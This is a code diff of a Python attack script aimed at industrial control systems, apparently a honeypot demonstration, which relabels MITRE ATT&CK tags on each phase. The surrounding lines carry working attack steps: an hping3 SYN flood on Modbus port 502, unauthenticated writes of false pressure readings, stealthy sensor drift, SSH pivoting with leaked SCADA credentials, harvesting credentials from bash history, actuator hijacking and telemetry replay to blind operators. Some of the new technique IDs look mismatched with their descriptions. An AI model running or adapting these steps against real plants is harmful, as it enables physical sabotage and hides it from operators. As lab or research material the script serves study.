@@ -199,8 +199,8 @@ def phase1_recon(targets: dict):
 # ─────────────────────────────────────────────────────────────────────────────
 def phase2_info_gathering(targets: dict):
     banner("PHASE 2: INFORMATION GATHERING")
-    killchain("Weaponization / Reconnaissance")
-    mitre("T1046", "Network Service Discovery", "Nmap NSE script detection for Modbus/S7")
+    killchain("Discovery")
+    mitre("T0846", "Network Service Discovery", "Identify ICS devices and services")
     
     host    = targets["modbus"]
     s7_host = targets["s7"]
@@ -242,8 +242,8 @@ def phase2_info_gathering(targets: dict):
 # ─────────────────────────────────────────────────────────────────────────────
 def phase3_vuln_scan(targets: dict):
     banner("PHASE 3: VULNERABILITY SCAN")
-    killchain("Weaponization")
-    mitre("T1190", "Exploit Public-Facing Application", "Fingerprinting to find missing auth on OT ports")
+    killchain("Discovery")
+    mitre("T0887", "Unauthorized Command Message", "Testing if ICS accepts commands without auth")
 
     host    = targets["modbus"]
     s7_host = targets["s7"]
@@ -262,7 +262,7 @@ def phase3_vuln_scan(targets: dict):
         except Exception:
             pass
 
-    mitre("T0861", "Point & Tag Identification", "Validating Modbus write capabilities")
+    mitre("T0855", "Unauthorized Command Message", "Write to Modbus register without authentication")
     info("Step 3 — Testing missing Modbus authentication (FC6 arbitrary write test)")
     if HAS_MODBUS:
         client = ModbusTcpClient(host, port=MODBUS_PORT)
@@ -279,8 +279,8 @@ def phase3_vuln_scan(targets: dict):
 # ─────────────────────────────────────────────────────────────────────────────
 def phase4_exploit(targets: dict):
     banner("PHASE 4: EXPLOIT — Semantic Injection")
-    killchain("Exploitation / Actions on Objectives")
-    mitre("T0836", "Modify Parameter", "Injecting false telemetry to spoof sensor state")
+    killchain("Execution")
+    mitre("T0855", "Unauthorized Command Message", "Injecting false sensor values via Modbus")
     
     warn("Writing 350 PSI to pressure sensor bypasses physical reality limits.")
     host = targets["modbus"]
@@ -295,19 +295,19 @@ def phase4_exploit(targets: dict):
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-# Phase 5: Payload Delivery
+# Phase 5: STEALTH DRIFT (or EWMA Stealth Drift)
 # ─────────────────────────────────────────────────────────────────────────────
 def phase5_payload(targets: dict):
-    banner("PHASE 5: PAYLOAD DELIVERY")
+    banner("PHASE 5: STEALTH DRIFT (or EWMA Stealth Drift)")
     killchain("Delivery / Actions on Objectives")
     
     host = targets["modbus"]
 
-    mitre("T0814", "Denial of Service", "SYN flood against ICS gateway")
+    mitre("T0814", "Denial of Service", "Flooding ICS service to disrupt availability")
     info("Step 1 — hping3 SYN flood on Modbus port 502 (5s burst)")
     run_cmd(f"hping3 -S -p {MODBUS_PORT} --flood --count 500 {host} 2>&1", 10)
 
-    mitre("T0836", "Modify Parameter", "Stealth cumulative drift to bypass simple thresholds")
+    mitre("T0855", "Unauthorized Command Message", "Gradual manipulation of sensor values")
     info("Step 2 — Stealth drift: +5 PSI over successive steps")
     if not HAS_MODBUS: return
 
@@ -355,7 +355,7 @@ def phase6_lateral_movement(targets: dict):
     except Exception:
         warn("Could not query honeypot API; assuming defaults for demo.")
 
-    mitre("T1078.003", "Valid Accounts: Local Accounts", "Logging into SCADA workstation with leaked LOW PRIVILEGE creds")
+    mitre("T0890", "Valid Accounts", "Using leaked SCADA credentials")
     info("━━ Step 3: Login as Engineer (Read-Only) ━━")
     eng_ssh = f"sshpass -p '{scada_pass}' ssh -o StrictHostKeyChecking=no -p {scada_port} {scada_user}@{scada_host}"
     cmd_label(f"{eng_ssh} 'whoami'")
@@ -363,13 +363,13 @@ def phase6_lateral_movement(targets: dict):
     if "SHELL_OK" in login_out:
         result("SSH PIVOT", f"Shell obtained: {scada_user}@{scada_host} (Engineer Role)")
         
-    mitre("T1082", "System Information Discovery", "Enumerating network context and dead-ends inside SCADA")
+    mitre("T0887", "System Discovery", "Enumerating SCADA environment")
     info("━━ Step 4: Deception Discovery (Fake PLC) ━━")
     cmd_label(f"{eng_ssh} 'cat /etc/hosts'")
     run_cmd(f"{eng_ssh} 'cat /etc/hosts'", 5)
     info("Attacker sees 'fake_plc_sim' and attempts to write to it, but it's a dead end.")
     
-    mitre("T1552.003", "Unsecured Credentials: Bash History", "Investigating engineer history for lateral paths")
+    mitre("T0891", "Credentials in Files", "Extracting credentials from logs/history")
     info("━━ Step 5: Enumerate Human Artifacts for Privilege Escalation ━━")
     cmd_label(f"{eng_ssh} 'cat ~/.bash_history'")
     out_hist = run_cmd(f"{eng_ssh} 'cat ~/.bash_history'", 5)
@@ -391,7 +391,7 @@ def phase6_lateral_movement(targets: dict):
     if "OPERATOR_OK" in op_out:
         result("PRIVILEGE ESCALATION", "Escalated from Engineer -> Operator. Full Modbus write access acquired.")
 
-    mitre("T1090.001", "Proxy: Internal Proxy", "Setting up an SSH tunnel as Operator to securely reach the OT segment")
+    mitre("T0885", "Remote Services", "Pivoting into OT network via SSH tunnel")
     info("━━ Step 7: SSH port-forward to OT layer ━━")
     cmd_label(f"ssh -o StrictHostKeyChecking=no -p {scada_port} {op_user}@{scada_host} -L 10502:{targets['modbus']}:502 -N -f")
 
@@ -402,7 +402,7 @@ def phase6_lateral_movement(targets: dict):
 def phase7_privesc(targets: dict):
     banner("PHASE 7: PRIVILEGE ESCALATION (Actuator Hijack)")
     killchain("Actions on Objectives")
-    mitre("T0883", "Manipulation of Control", "Sending FC6 instructions to directly command actuators")
+    mitre("T0855", "Unauthorized Command Message", "Direct actuator manipulation via PLC commands")
     
     host = targets["modbus"]
     if not HAS_MODBUS: return
@@ -424,7 +424,7 @@ def phase7_privesc(targets: dict):
 def phase8_replay(targets: dict):
     banner("PHASE 8: REPLAY ATTACK — Telemetry Spoofing")
     killchain("Actions on Objectives")
-    mitre("T0813", "Denial of View / Replay Attack", "Sustained injection of frozen telemetry to InfluxDB to blind the operator")
+    mitre("T0822", "Loss of View", "Replay telemetry to hide real system state")
     
     INFLUX_URL   = "http://ics_historian:8086/api/v2/write?org=my_refinery&bucket=sensor_logs&precision=ns"
     INFLUX_TOKEN = os.environ.get("INFLUX_TOKEN", "supersecrettoken")
